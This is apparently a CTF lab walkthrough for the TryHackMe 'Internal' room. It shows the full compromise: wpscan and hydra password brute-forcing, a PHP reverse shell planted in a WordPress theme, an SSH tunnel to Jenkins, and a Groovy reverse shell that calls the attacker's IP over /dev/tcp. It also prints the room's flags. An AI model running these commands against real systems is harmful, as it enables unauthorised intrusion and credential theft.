# Internal - THM

## Enumeration
### Firstly we have to add the ip to /etc/hosts
```
sudo nano /etc/hosts

#THM 
10.10.51.186    internal.thm
```
### Let's start with the nmap scan 
```
# Nmap 7.92 scan initiated Fri Nov 19 17:37:45 2021 as: nmap -sC -sV -oN nmap 10.10.113.87
Nmap scan report for 10.10.113.87
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 19 17:38:32 2021 -- 1 IP address (1 host up) scanned in 47.54 seconds

```

### Here we find a web server runnuing, So lets run gobuster, Here are the results

```
gobuster dir -u http://internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster
```
```
/blog                 (Status: 301) [Size: 311] [--> http://10.10.113.87/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.113.87/wordpress/]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.113.87/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.113.87/phpmyadmin/]
```
### Here we get to know that the server is running wordpress on /blog directory
```
http://internal.thm/blog
```
### Let's run gobuster on the directory /blog and 
```
gobuster dir -u http://internal.thm/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster2

```
```
/wp-content           (Status: 301) [Size: 322] [--> http://internal.thm/blog/wp-content/]
/wp-includes          (Status: 301) [Size: 323] [--> http://internal.thm/blog/wp-includes/]
/wp-admin             (Status: 301) [Size: 320] [--> http://internal.thm/blog/wp-admin/]
```

### After some enumeration we find a post showing that the user is admin
```


img 1 


```

### And after enumerating more we find the login wp url and the bottom of the page and also we find the login directory on our second gobuster scan
```
http://internal.thm/blog/wp-admin
```

### So lets try to bruteforce by using wpscan
```
wpscan --url http://internal.thm/blog --usernames admin --passwords /home/sig/Downloads/rockyou.txt 
```
### Here are the scan results 
```
wpscan --url http://internal.thm/blog --usernames admin --passwords /home/sig/Downloads/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.113.87]
[+] Started: Fri Nov 19 18:13:33 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=======================================================================================> (137 / 137) 100.00% Time: 00:00:06
                                                                                                                                                                      
[i] No Config Backups Found.                                                                                                                                          

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                           
Trying admin / my2boys Time: 00:06:08 <                                                                                      > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Nov 19 18:20:09 2021
[+] Requests Done: 4025
[+] Cached Requests: 38
[+] Data Sent: 2.032 MB
[+] Data Received: 2.306 MB
[+] Memory used: 288.574 MB
[+] Elapsed time: 00:06:35

```
### Here are the creds of the wp-login page 
```
admin:my2boys
```

### It's time to get a reverse shell and by starting a netcat listner
```
nc -lnvp 4444
```
### And by uploading the php reverse shell on the twenty seventeen themes 404.php page 
```

img 2


```
### And by opening the 404.php url 
```
https://10.10.51.186/blog/wp-content/themes/twentyseventeen/404.php
```

### And boom we got the shell 
```
nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.9.52.153] from (UNKNOWN) [10.10.113.87] 59406
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:55:14 up 48 min,  0 users,  load average: 0.19, 0.25, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### So lets enumerate the server 

### Here we find the user aubreanna which is not accessable by the www-data 
### So we tried the command 
```
locate *.txt 
```
### And here we find the wp-save.txt text file on
```
/opt/wp-save.txt
```

### We got the creds of user aubreanna in this file 
```
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

### Let's try to switch the user to aubreanna, for that we have to get a tty shell for that we have to put the cmd
```
$ python -c "import pty;pty.spawn('/bin/bash')"
```

### Then we tried to switch the user 
```
su aubreanna 
Password: bubb13guM!@#123

aubreanna@internal:/opt$ 

```
### And BOOOOOMMMMMMMM!!!!!!!!!!! Finally we got the user flag 
```
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1}
```

## Prev Esc

### And there is another file named jenkins, lets check it
```
aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080

```

### Here we get to know that its running a docker container
### So, to access it we are going to use SSH tunneling technique to forward Jenkins ip:port to our attacker machine’s ip:port
```
ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm                                                                                                            1 ⚙
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 20 11:56:16 UTC 2021

  System load:  0.08              Processes:              116
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 33%               IP address for eth0:    10.10.51.186
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$
```

### After tunneling we can access the docer container by opening 
```
http://localhost:6767/
```

### And here we see the docker container is showing jenkins login page 
### So by using the default creds admin:password it doesn't login 
### So let's try to bruteforce the login page using hydra
```
$ hydra -l admin -P /home/sig/Downloads/rockyou.txt -s 6767 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password'
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-20 17:30:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://127.0.0.1:6767/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[6767][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-20 17:31:37

```

### And BOOOOOOMMMMMMM!!!!! We got the creds
```
admin:spongebob
```

### Now lets go to "manage jenkins" and then go to "script console" and run our java(groovy script) reverse shell i.e
### On attacker machine
```
nc -lnvp 5555
```
### On the script console 
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.9.53.152/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### And yeeeeeeessssssss!!!!!! We are on the server and here we find a note i.e
```
jenkins@jenkins:/opt$ ls 
ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

### That contains the root creds
```
root:tr0ub13guM!@#123
```

### Lets ssh the server as root
```
$ ssh root@internal.thm
```

### And here we are on the webserver as root 
### And finallyyyyy We got out root flag i.e
```
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
```

# <3 By SIG WOTTS
